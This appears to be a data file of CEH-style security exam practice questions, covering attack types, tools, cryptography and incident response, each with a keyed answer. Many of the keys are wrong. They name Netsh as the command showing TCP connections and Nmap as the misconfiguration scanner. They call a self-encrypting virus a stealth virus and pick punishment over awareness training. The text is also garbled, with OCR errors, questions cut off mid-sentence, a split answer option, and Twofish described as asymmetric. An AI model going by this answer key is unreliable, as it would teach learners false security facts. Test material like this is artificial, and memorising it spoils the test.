"Nedved is an IT Security Manager of a bank in his country. One day. he found out that there is a security breach to his company's email server based on analysis of a suspicious connection from the email server to an unknown IP Address. What is the first thing that Nedved needs to do before contacting the incident response team?\nA. Leave it as it Is and contact the incident response te3m right away\nB. Block the connection to the suspicious IP Address from the firewall\nC. Disconnect the email server from the network\nD. Migrate the connection to the backup email server\n","Answer: C — C. Disconnect the email server from the network"
"s) which of the following protocols can be used to secure an LDAP service against anonymous queries?\nA. SSO\nB. RADIUS\nC. WPA\nD. NTLM\n","Answer: D — D. NTLM"
"Boney, a professional hacker, targets an organization for financial benefits. He performs an attack by sending his session ID using an MITM attack technique. Boney first obtains a valid session ID by logging into a service and later feeds the same session 10 to the target employee. The session ID links the target employee to Boneys account page without disclosing any information to the victim. When the target employee clicks on the link, all the sensitive payment details entered in a form are linked to Boneys account. What is the attack performed by Boney in the above scenario?\nA. Session donation attack\nB. Session fixation attack\nC. Forbidden attack\nD. CRIME attack\n","Answer: A — A. Session donation attack"
"Vlady works in a fishing company where the majority of the employees have very little understanding of IT let alone IT Security. Several information security issues that Vlady often found includes, employees sharing password, writing his/her password on a post it note and stick it to his/her desk, leaving the computer unlocked, didn??t log out from emails or other social media accounts, and etc. After discussing with his boss, Vlady decided to make some changes to improve the security environment in his company. The first thing that Vlady wanted to do is to make the employees understand the importance of keeping confidential information, such as password, a secret and they should not share it with other persons. Which of the following steps should be the first thing that Vlady should do to make the employees in his company understand to importance of keeping confidential information a secret?\nA. Warning to those who write password on a post it note and put it on his/her desk\nB. Developing a strict information security policy\nC. Information security awareness training\nD. Conducting a one to one discussion with the other employees about the importance of information security\n","Answer: A — A. Warning to those who write password on a post it note and put it on his/her desk"
"What is one of the advantages of using both symmetric and asymmetric cryptography in SSL/TLS?\nA. Symmetric algorithms such as AES provide a failsafe when asymmetric methods fail.\nB. Asymmetric cryptography is computationally expensive in compariso\nC. However, it is well-suited to securely negotiate keys for use with symmetric cryptography.\nD. Symmetric encryption allows the server to securely transmit the session keys out-of- band.\nE. Supporting both types of algorithms allows less-powerful devices such as mobile phones to use symmetric encryption instead.\n","Answer: D — D. Symmetric encryption allows the server to securely transmit the session keys out-of- band."
"Ethical hacker jane Smith is attempting to perform an SQL injection attach. She wants to test the response time of a true or false response and wants to use a second command to determine whether the database will return true or false results for user IDs. which two SQL Injection types would give her the results she is looking for?\nA. Out of band and boolean-based\nB. Time-based and union-based\nC. union-based and error-based\nD. Time-based and boolean-based\n","Answer: D — D. Time-based and boolean-based"
"What kind of detection techniques is being used in antivirus softwares that identifies malware by collecting data from multiple protected systems and instead of analyzing files locally it's made on the premiers environment-\nA. VCloud based\nB. Honypot based\nC. Behaviour based\nD. Heuristics based\n","Answer: A — A. VCloud based"
"Bella, a security professional working at an it firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames. and passwords are shared In plaintext, paving the way for hackers 10 perform successful session hijacking. To address this situation. Bella Implemented a protocol that sends data using encryption and digital certificates. Which of the following protocols Is used by Bella?\nA. FTP\nB. HTTPS\nC. FTPS\nD. IP\n","Answer: C — C. FTPS"
"is a tool that can hide processes from the process list, can hide files, registry entries, and intercept keystrokes.\nA. Trojan\nB. RootKit\nC. DoS tool\nD. Scanner\nE. Backdoor\n","Answer: B — B. RootKit"
"These hackers have limited or no training and know how to use only basic techniques or tools. What kind of hackers are we talking about?\nA. Black-Hat Hackers A\nB. Script Kiddies\nC. White-Hat Hackers\nD. Gray-Hat Hacker\n","Answer: B — B. Script Kiddies"
"Sam is working as a system administrator In an organization. He captured the principal characteristics of a vulnerability and produced a numerical score to reflect Its severity using CVSS v3.0 to property assess and prioritize the organization's vulnerability management processes. The base score that Sam obtained after performing cvss rating was 4.0. What is the CVSS severity level of the vulnerability discovered by Sam in the above scenario?\nA. Medium\nB. Low\nC. Critical\nD. High\n","Answer: A — A. Medium"
"John is an incident handler at a financial institution. His steps in a recent incident are not up to the standards of the company. John frequently forgets some steps and procedures while handling responses as they are very stressful to perform. Which of the following actions should John take to overcome this problem with the least administrative effort?\nA. Create an incident checklist.\nB. Select someone else to check the procedures.\nC. Increase his technical skills.\nD. Read the incident manual every time it occurs.\n","Answer: C — C. Increase his technical skills."
"What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack against an organization?\nA. The attacker queries a nameserver using the DNS resolver.\nB. The attacker makes a request to the DNS resolver.\nC. The attacker forges a reply from the DNS resolver.\nD. The attacker uses TCP to poison the ONS resofver.\n","Answer: B — B. The attacker makes a request to the DNS resolver."
"Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary In the above scenario.\nA. use of command-line interface\nB. Data staging\nC. Unspecified proxy activities\nD. Use of DNS tunneling\n","Answer: C — C. Unspecified proxy activities"
"What type of analysis is performed when an attacker has partial knowledge of inner- workings of the application?\nA. Black-box\nB. Announced\nC. White-box\nD. Grey-box\n","Answer: D — D. Grey-box"
"What would be the fastest way to perform content enumeration on a given web server by using the Gobuster tool?\nA. Performing content enumeration using the bruteforce mode and 10 threads\nB. Shipping SSL certificate verification\nC. Performing content enumeration using a wordlist\nD. Performing content enumeration using the bruteforce mode and random file extensions\n","Answer: C — C. Performing content enumeration using a wordlist"
"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since the file did nothing when executed, he asks you for help because he suspects that he may have installed a trojan on his computer. what tests would you perform to determine whether his computer Is Infected?\nA. Use ExifTool and check for malicious content.\nB. You do not check; rather, you immediately restore a previous snapshot of the operating system.\nC. Upload the file to VirusTotal.\nD. Use netstat and check for outgoing connections to strange IP addresses or domains.\n","Answer: D — D. Use netstat and check for outgoing connections to strange IP addresses or domains."
"An organization is performing a vulnerability assessment tor mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as an email server, a web server or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests. What is the type of vulnerability assessment solution that James employed in the above scenario?\nA. Product-based solutions\nB. Tree-based assessment\nC. Service-based solutions\nD. inference-based assessment\n","Answer: D — D. inference-based assessment"
"Gavin owns a white-hat firm and is performing a website security audit for one of his clients. He begins by running a scan which looks for common misconfigurations and outdated software versions. Which of the following tools is he most likely using?\nA. Nikto\nB. Nmap\nC. Metasploit\nD. Armitage\n","Answer: B — B. Nmap"
"During the process of encryption and decryption, what keys are shared?\nA. Private keys\nB. User passwords\nC. Public keys\nD. Public and private keys\n","Answer: C — C. Public keys"
"Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently. Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture Is Abel currently working in?\nA. Tier-1: Developer machines\nB. Tier-4: Orchestrators\nC. Tier-3: Registries\nD. Tier-2: Testing and accreditation systems\n","Answer: D — D. Tier-2: Testing and accreditation systems"
"Henry Is a cyber security specialist hired by BlackEye - Cyber security solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unkornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which Indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.\nA. 64\nB. 128\nC. 255\nD. 138\n","Answer: B — B. 128"
"When a security analyst prepares for the formal security assessment - what of the following should be done in order to determine inconsistencies in the secure assets database and verify that system is compliant to the minimum security baseline?\nA. Data items and vulnerability scanning\nB. Interviewing employees and network engineers\nC. Reviewing the firewalls configuration\nD. Source code review\n","Answer: A — A. Data items and vulnerability scanning"
"which type of virus can change its own code and then cipher itself multiple times as it replicates?\nA. Stealth virus\nB. Tunneling virus\nC. Cavity virus\nD. Encryption virus\n","Answer: A — A. Stealth virus"
"Which of the following statements is FALSE with respect to Intrusion Detection Systems?\nA. Intrusion Detection Systems can be configured to distinguish specific content in network packets\nB. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic\nC. Intrusion Detection Systems require constant update of the signature library\nD. Intrusion Detection Systems can examine the contents of the data n context of the network protocol\n","Answer: B — B. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic"
"Which of the following DoS tools is used to attack target web applications by starvation of available sessions on the web server? The tool keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.\nA. My Doom\nB. Astacheldraht\nC. R-U-Dead-Yet?(RUDY)\nD. LOIC\n","Answer: C — C. R-U-Dead-Yet?(RUDY)"
"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?\nA. internal assessment\nB. Passive assessment\nC. External assessment\nD. Credentialed assessment\n","Answer: B — B. Passive assessment"
"Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities In the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?\nA. Pretexting\nB. Pharming\nC. Wardriving\nD. Skimming\n","Answer: B — B. Pharming"
"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT. POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?\nA. JSON-RPC\nB. SOAP API\nC. RESTful API\nD. REST API\n","Answer: C — C. RESTful API"
"This form of encryption algorithm is asymmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?\nA. Twofish encryption algorithm\nB. HMAC encryption algorithm\nC. IDEA\nD. Blowfish encryption algorithm\n","Answer: A — A. Twofish encryption algorithm"
"Which command can be used to show the current TCP/IP connections?\nA. Netsh\nB. Netstat\nC. Net use connection\nD. Net use\n","Answer: A — A. Netsh"
"Tremp is an IT Security Manager, and he is planning to deploy an IDS in his small company. He is looking for an IDS with the following characteristics: - Verifies success or failure of an attack - Monitors system activities Detects attacks that a network-based IDS fails to detect - Near real-time detection and response - Does not require additional hardware - Lower entry cost Which type of IDS is best suited for Tremp's requirements?\nA. Gateway-based IDS\nB. Network-based IDS\nC. Host-based IDS\nD. Open source-based\n","Answer: C — C. Host-based IDS"
"Which of the following are well known password-cracking programs?\nA. L0phtcrack\nB. NetCat\nC. Jack the Ripper\nD. Netbus\nE. John the Ripper\n","Answer: AE — A. L0phtcrack; E. John the Ripper"
"What is the algorithm used by LM for Windows2000 SAM?\nA. MD4\nB. DES\nC. SHA\nD. SSL\n","Answer: B — B. DES"
"In Trojan terminology, what is a covert channel?\nA. A channel that transfers information within a computer system or network in a way that violates the security policy\nB. A legitimate communication path within a computer system or network for transfer of data\nC. It is a kernel operation that hides boot processes and services to mask detection\nD. It is Reverse tunneling technique that uses HTTPS protocol instead of HTTP protocol to establish connections\n","Answer: A — A. A channel that transfers information within a computer system or network in a way that violates the security policy"
"Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this. James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?\nA. ophcrack\nB. Hootsuite\nC. VisualRoute\nD. HULK\n","Answer: B — B. Hootsuite"
"s) for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?\nA. CPU\nB. GPU\nC. UEFI\nD. TPM\n","Answer: D — D. TPM"
"An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim's data. What type of attack is this?\nA. Phishing\nB. Vlishing\nC. Spoofing\nD. DDoS\n","Answer: A — A. Phishing"
"Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of the following attacks did Abel perform in the above scenario?\nA. VLAN hopping\nB. DHCP starvation\nC. Rogue DHCP server attack\nD. STP attack\n","Answer: B — B. DHCP starvation"
"what is the port to block first in case you are suspicious that an loT device has been compromised?\nA. 22\nB. 443\nC. 48101\nD. 80\n","Answer: C — C. 48101"
